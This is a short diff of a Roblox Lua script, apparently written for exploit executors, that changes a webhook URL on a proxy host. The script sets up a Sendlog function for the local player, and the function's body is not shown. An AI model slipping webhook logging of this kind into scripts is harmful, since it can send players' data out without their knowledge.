@@ -1,5 +1,5 @@
 local HttpService = game:GetService("HttpService")
-local webhook_url = "https://vineyard.performave.com/api/webhook/v1/proxy/0b778978-37c5-4bdf-ac0d-ebcfa0c73cda"
+local webhook_url = "https://vineyard.performave.com/api/webhook/v1/proxy/2405b9a4-d7d8-4707-8c98-c0c1bd71b066"
 local player = game.Players.LocalPlayer
     local options = http_request or syn.request or request
     function Sendlog()
